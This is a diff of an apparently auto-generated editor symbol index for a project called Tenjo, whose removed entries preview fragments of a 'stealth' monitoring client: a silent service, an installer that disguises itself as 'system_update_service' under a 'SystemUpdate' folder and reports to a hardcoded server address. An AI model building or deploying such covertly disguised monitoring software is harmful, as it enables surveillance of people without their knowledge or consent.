@@ -312,48 +312,6 @@
         "documentation": {}
     },
     {
-        "label": "Path",
-        "importPath": "pathlib",
-        "description": "pathlib",
-        "isExtraImport": true,
-        "detail": "pathlib",
-        "documentation": {}
-    },
-    {
-        "label": "Path",
-        "importPath": "pathlib",
-        "description": "pathlib",
-        "isExtraImport": true,
-        "detail": "pathlib",
-        "documentation": {}
-    },
-    {
-        "label": "Path",
-        "importPath": "pathlib",
-        "description": "pathlib",
-        "isExtraImport": true,
-        "detail": "pathlib",
-        "documentation": {}
-    },
-    {
-        "label": "shutil",
-        "kind": 6,
-        "isExtraImport": true,
-        "importPath": "shutil",
-        "description": "shutil",
-        "detail": "shutil",
-        "documentation": {}
-    },
-    {
-        "label": "argparse",
-        "kind": 6,
-        "isExtraImport": true,
-        "importPath": "argparse",
-        "description": "argparse",
-        "detail": "argparse",
-        "documentation": {}
-    },
-    {
         "label": "lexers",
         "importPath": "sphinx.highlighting",
         "description": "sphinx.highlighting",
@@ -484,87 +442,6 @@
         "description": "client.main",
         "peekOfCode": "shutdown_flag = False\ndef signal_handler(signum, frame):\n    \"\"\"Handle shutdown signals gracefully\"\"\"\n    global shutdown_flag\n    logging.info(f\"Received signal {signum}, initiating graceful shutdown...\")\n    shutdown_flag = True\nclass TenjoClient:\n    def __init__(self, stealth_mode=True):\n        # Use API_ENDPOINT from config\n        self.api_client = APIClient(Config.SERVER_URL, Config.CLIENT_ID)",
         "detail": "client.main",
-        "documentation": {}
-    },
-    {
-        "label": "StealthService",
-        "kind": 6,
-        "importPath": "client.service",
-        "description": "client.service",
-        "peekOfCode": "class StealthService:\n    def __init__(self):\n        self.running = False\n        self.threads = []\n    def start(self):\n        \"\"\"Start the stealth monitoring service\"\"\"\n        if self.running:\n            return\n        self.running = True\n        try:",
-        "detail": "client.service",
-        "documentation": {}
-    },
-    {
-        "label": "main",
-        "kind": 2,
-        "importPath": "client.service",
-        "description": "client.service",
-        "peekOfCode": "def main():\n    \"\"\"Main service entry point\"\"\"\n    try:\n        # Run completely silent\n        service = StealthService()\n        service.start()\n    except:\n        # Silent failure\n        pass\nif __name__ == \"__main__\":",
-        "detail": "client.service",
-        "documentation": {}
-    },
-    {
-        "label": "current_dir",
-        "kind": 5,
-        "importPath": "client.service",
-        "description": "client.service",
-        "peekOfCode": "current_dir = os.path.dirname(os.path.abspath(__file__))\nsys.path.insert(0, os.path.join(current_dir, 'src'))\nclass StealthService:\n    def __init__(self):\n        self.running = False\n        self.threads = []\n    def start(self):\n        \"\"\"Start the stealth monitoring service\"\"\"\n        if self.running:\n            return",
-        "detail": "client.service",
-        "documentation": {}
-    },
-    {
-        "label": "StealthInstaller",
-        "kind": 6,
-        "importPath": "client.stealth_install",
-        "description": "client.stealth_install",
-        "peekOfCode": "class StealthInstaller:\n    def __init__(self, server_url=\"http://103.129.149.67\"):\n        self.system = platform.system().lower()\n        self.server_url = server_url\n        self.install_dir = self._get_install_dir()\n        self.service_name = \"system_update_service\"\n    def _get_install_dir(self):\n        \"\"\"Get appropriate installation directory based on OS\"\"\"\n        if self.system == \"windows\":\n            return os.path.join(os.environ.get('APPDATA', ''), 'SystemUpdate')",
-        "detail": "client.stealth_install",
-        "documentation": {}
-    },
-    {
-        "label": "main",
-        "kind": 2,
-        "importPath": "client.stealth_install",
-        "description": "client.stealth_install",
-        "peekOfCode": "def main():\n    \"\"\"Main installation function\"\"\"\n    # Get server URL from command line or use default\n    server_url = sys.argv[1] if len(sys.argv) > 1 else \"http://103.129.149.67\"\n    installer = StealthInstaller(server_url)\n    success = installer.silent_install()\n    # No output - completely silent\n    sys.exit(0 if success else 1)\nif __name__ == \"__main__\":\n    main()",
-        "detail": "client.stealth_install",
-        "documentation": {}
-    },
-    {
-        "label": "TenjoStartup",
-        "kind": 6,
-        "importPath": "client.tenjo_startup",
-        "description": "client.tenjo_startup",
-        "peekOfCode": "class TenjoStartup:\n    def __init__(self, server_url=None, stealth_mode=True):\n        self.server_url = server_url or Config.SERVER_URL\n        self.stealth_mode = stealth_mode\n        self.client = None\n        self.stealth_manager = None\n        self.running = False\n        # Setup logging\n        self.setup_logging()\n    def setup_logging(self):",
-        "detail": "client.tenjo_startup",
-        "documentation": {}
-    },
-    {
-        "label": "main",
-        "kind": 2,
-        "importPath": "client.tenjo_startup",
-        "description": "client.tenjo_startup",
-        "peekOfCode": "def main():\n    \"\"\"Main entry point\"\"\"\n    parser = argparse.ArgumentParser(description='Tenjo Client Startup Script')\n    parser.add_argument('--server-url', '-s', \n                       help='Server URL (default: from config)')\n    parser.add_argument('--no-stealth', action='store_true',\n                       help='Disable stealth mode')\n    parser.add_argument('--install-service', action='store_true',\n                       help='Install as system service')\n    parser.add_argument('--uninstall-service', action='store_true',",
-        "detail": "client.tenjo_startup",
-        "documentation": {}
-    },
-    {
-        "label": "current_dir",
-        "kind": 5,
-        "importPath": "client.tenjo_startup",
-        "description": "client.tenjo_startup",
-        "peekOfCode": "current_dir = Path(__file__).parent\nsrc_dir = current_dir / 'src'\nsys.path.insert(0, str(src_dir))\n# Import after path setup\ntry:\n    from core.config import Config\n    from utils.stealth import StealthManager\n    from main import TenjoClient\nexcept ImportError as e:\n    print(f\"Error importing modules: {e}\")",
-        "detail": "client.tenjo_startup",
-        "documentation": {}
-    },
-    {
-        "label": "src_dir",
-        "kind": 5,
-        "importPath": "client.tenjo_startup",
-        "description": "client.tenjo_startup",
-        "peekOfCode": "src_dir = current_dir / 'src'\nsys.path.insert(0, str(src_dir))\n# Import after path setup\ntry:\n    from core.config import Config\n    from utils.stealth import StealthManager\n    from main import TenjoClient\nexcept ImportError as e:\n    print(f\"Error importing modules: {e}\")\n    print(\"Make sure all required modules are installed and paths are correct.\")",
-        "detail": "client.tenjo_startup",
         "documentation": {}
     },
     {
